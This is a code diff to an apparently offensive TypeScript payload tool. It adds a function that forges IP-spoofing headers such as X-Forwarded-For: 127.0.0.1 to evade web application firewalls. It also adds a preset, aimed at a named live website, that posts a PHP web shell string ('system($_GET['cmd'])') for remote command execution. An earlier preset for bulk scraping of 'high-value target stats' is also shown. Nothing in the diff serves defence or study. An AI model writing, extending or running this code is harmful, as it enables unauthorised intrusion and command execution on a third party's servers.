@@ -22,6 +22,22 @@ export interface PayloadConfig {
   delay?: number;
 }
 
+export function generateWafBypassHeaders(): Record<string, string> {
+  return {
+    'X-Originating-IP': '127.0.0.1',
+    'X-Forwarded-For': '127.0.0.1',
+    'X-Remote-IP': '127.0.0.1',
+    'X-Remote-Addr': '127.0.0.1',
+    'X-Client-IP': '127.0.0.1',
+    'X-Host': 'localhost',
+    'X-Forwarded-Host': 'localhost',
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+    'Accept-Encoding': 'gzip, deflate, br',
+    'Connection': 'keep-alive',
+    'Cache-Control': 'no-cache',
+  };
+}
+
 export async function executePayload(config: PayloadConfig): Promise<PayloadResult[]> {
   const results: PayloadResult[] = [];
   const startTime = Date.now();
@@ -92,5 +108,18 @@ export const PRESET_PAYLOADS = [
     method: "GET",
     concurrency: 5,
     description: "Rapid scraping of high-value target stats."
+  },
+  {
+    name: "Nightfury-X: WAF Bypass & PHP/Vue Exposure",
+    url: "https://runehall.com/api/debug/exposure",
+    method: "POST",
+    body: JSON.stringify({ 
+      action: "reflect", 
+      payload: "<?php system($_GET['cmd']); ?>",
+      context: "vue_state_dump" 
+    }),
+    headers: generateWafBypassHeaders(),
+    concurrency: 3,
+    description: "Sophisticated WAF bypass targeting reflective PHP execution and Vue source exposure."
   }
 ];
